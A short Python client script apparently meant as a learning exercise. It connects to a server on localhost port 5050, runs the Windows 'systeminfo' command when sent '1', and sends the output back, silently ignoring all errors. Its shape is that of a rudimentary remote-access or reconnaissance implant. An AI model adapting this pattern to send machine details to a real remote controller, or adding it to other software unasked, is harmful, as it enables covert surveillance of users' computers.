import socket
import subprocess

HOST = '127.0.0.1'  # The server's IP
PORT = 5050  # The server's port
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            data = s.recv(4096).decode("utf-8")
            if data == '1':
                proc = subprocess.Popen('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                s.sendall(stdout_value)
            if data == '2':
                s.close()
                break
except Exception:
    pass
